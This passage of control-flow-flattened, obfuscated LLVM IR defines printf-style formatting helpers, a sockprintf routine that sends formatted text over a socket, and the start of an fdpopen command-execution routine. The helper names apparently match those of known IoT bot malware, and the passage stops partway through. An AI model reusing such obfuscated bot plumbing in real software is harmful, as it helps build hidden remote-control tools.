  store i32 %218, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %5, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp eq i32 %222, 117
  %224 = select i1 %223, i32 524468470, i32 -1698154320
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8**, i8*** %4, align 8
  store i8** %226, i8*** %.reg2mem52
  %227 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %227, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %228, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %229 = load i32, i32* %.reload60, align 8
  store i32 %229, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %230 = icmp ule i32 %.reload64, 40
  %231 = select i1 %230, i32 931751595, i32 2074054678
  store i32 %231, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %233 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %234 = load i8*, i8** %233, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %235 = getelementptr i8, i8* %234, i32 %.reload63
  %236 = bitcast i8* %235 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %237 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %237, i32* %.reload59, align 8
  store i32 -1113900047, i32* %switchVar
  store i32* %236, i32** %.reg2mem88
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %239 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %240 = load i8*, i8** %239, align 8
  %241 = bitcast i8* %240 to i32*
  %242 = getelementptr i8, i8* %240, i32 8
  store i8* %242, i8** %239, align 8
  store i32 -1113900047, i32* %switchVar
  store i32* %241, i32** %.reg2mem88
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %244 = load i32, i32* %.reload89, align 4
  %245 = load i32, i32* %7, align 4
  %246 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %247 = call i32 @printi(i8** %.reload53, i32 %244, i32 10, i32 0, i32 %245, i32 %246, i32 97)
  %248 = load i32, i32* %9, align 4
  %249 = add nsw i32 %248, %247
  store i32 %249, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %5, align 8
  %252 = load i8, i8* %251, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 99
  %255 = select i1 %254, i32 -1297489775, i32 -1707646553
  store i32 %255, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %257, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %258 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %258, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %259 = load i32, i32* %.reload71, align 8
  store i32 %259, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %260 = icmp ule i32 %.reload75, 40
  %261 = select i1 %260, i32 -892214975, i32 -1516523109
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %264 = load i8*, i8** %263, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %265 = getelementptr i8, i8* %264, i32 %.reload74
  %266 = bitcast i8* %265 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %267 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %267, i32* %.reload70, align 8
  store i32 667294870, i32* %switchVar
  store i32* %266, i32** %.reg2mem90
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %270 = load i8*, i8** %269, align 8
  %271 = bitcast i8* %270 to i32*
  %272 = getelementptr i8, i8* %270, i32 8
  store i8* %272, i8** %269, align 8
  store i32 667294870, i32* %switchVar
  store i32* %271, i32** %.reg2mem90
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %274 = load i32, i32* %.reload91, align 4
  %275 = trunc i32 %274 to i8
  %276 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %275, i8* %276, align 1
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %277, align 1
  %278 = load i8**, i8*** %4, align 8
  %279 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %280 = load i32, i32* %7, align 4
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @prints(i8** %278, i8* %279, i32 %280, i32 %281)
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, %282
  store i32 %284, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 2067009737, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 532951065, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = load i8*, i8** %5, align 8
  %290 = load i8, i8* %289, align 1
  %291 = zext i8 %290 to i32
  call void @printchar(i8** %288, i32 %291)
  %292 = load i32, i32* %9, align 4
  %293 = add nsw i32 %292, 1
  store i32 %293, i32* %9, align 4
  store i32 2067009737, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8*, i8** %5, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %5, align 8
  store i32 1656549577, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = load i8**, i8*** %4, align 8
  %300 = icmp ne i8** %299, null
  %301 = select i1 %300, i32 1321762295, i32 -1786720826
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i8**, i8*** %4, align 8
  %304 = load i8*, i8** %303, align 8
  store i8 0, i8* %304, align 1
  store i32 -1786720826, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %307 = bitcast %struct.__va_list_tag* %306 to i8*
  call void @llvm.va_end(i8* %307)
  %308 = load i32, i32* %9, align 4
  ret i32 %308

loopEnd:                                          ; preds = %302, %298, %295, %294, %287, %286, %285, %273, %268, %262, %256, %250, %243, %238, %232, %225, %219, %212, %207, %201, %194, %188, %181, %176, %170, %163, %157, %150, %145, %139, %132, %126, %120, %119, %117, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -657593653, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -657593653, label %first
    i32 1261844912, label %16
    i32 -709500100, label %18
    i32 812112957, label %23
    i32 33534477, label %26
    i32 -949313811, label %29
    i32 605478422, label %34
    i32 -1347492010, label %35
    i32 -1474263569, label %39
    i32 1145196654, label %44
    i32 1337149066, label %45
    i32 401709400, label %46
    i32 1460109623, label %51
    i32 -275670633, label %52
    i32 -701270524, label %56
    i32 -2098554019, label %61
    i32 -9371603, label %64
    i32 -578577545, label %65
    i32 -148543971, label %66
    i32 282726933, label %71
    i32 -376500454, label %78
    i32 890016742, label %81
    i32 378662351, label %82
    i32 1649255194, label %86
    i32 -1062499052, label %91
    i32 -2032154935, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 1261844912, i32 401709400
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 -709500100, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 812112957, i32 -949313811
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 33534477, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 -709500100, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 605478422, i32 -1347492010
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1474263569, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 -1474263569, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1145196654, i32 1337149066
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 1337149066, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 401709400, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -578577545, i32 1460109623
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -275670633, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -701270524, i32 -9371603
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -2098554019, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -275670633, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -578577545, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -148543971, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 282726933, i32 890016742
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -376500454, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -148543971, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 378662351, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1649255194, i32 -2032154935
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -1062499052, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 378662351, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 692892874, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 692892874, label %first
    i32 -857815517, label %26
    i32 -973974880, label %34
    i32 -2051058894, label %38
    i32 -794787712, label %42
    i32 -784775963, label %46
    i32 -846838579, label %49
    i32 -163535676, label %54
    i32 1576284697, label %58
    i32 -412723785, label %65
    i32 -14898521, label %71
    i32 413345817, label %80
    i32 1077900640, label %84
    i32 1967250275, label %88
    i32 -2027300450, label %93
    i32 206523586, label %99
    i32 -1195277599, label %102
    i32 -1728789163, label %103
    i32 1569951730, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -857815517, i32 -973974880
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 1569951730, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -2051058894, i32 -846838579
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 -794787712, i32 -846838579
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -784775963, i32 -846838579
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 -846838579, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -163535676, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 1576284697, i32 413345817
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -412723785, i32 -14898521
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -14898521, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -163535676, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1077900640, i32 -1728789163
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 1967250275, i32 206523586
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 -2027300450, i32 206523586
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 -1195277599, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 -1195277599, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 -1728789163, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 1569951730, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -887727525, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -887727525, label %first
    i32 402886962, label %8
    i32 1417298153, label %16
    i32 -316284004, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 402886962, i32 1417298153
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -316284004, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -316284004, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 698086182, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 698086182, label %first
    i32 1456217124, label %15
    i32 1728000630, label %21
    i32 -1015343068, label %28
    i32 -1442432514, label %29
    i32 -609453504, label %34
    i32 -265793625, label %35
    i32 -800938631, label %39
    i32 58769967, label %43
    i32 -1039784144, label %44
    i32 -296718462, label %54
    i32 -639064540, label %55
    i32 899757205, label %61
    i32 249759176, label %NodeBlock
    i32 -967170824, label %LeafBlock1
    i32 -2119633674, label %LeafBlock
    i32 -1494296155, label %66
    i32 2027023031, label %73
    i32 961597428, label %79
    i32 1891517081, label %84
    i32 1658441723, label %91
    i32 -2034520762, label %95
    i32 1527026372, label %100
    i32 1007743906, label %107
    i32 -1797362751, label %111
    i32 -600716368, label %NewDefault
    i32 849162065, label %114
    i32 -1004870007, label %120
    i32 115081032, label %126
    i32 -1177879879, label %132
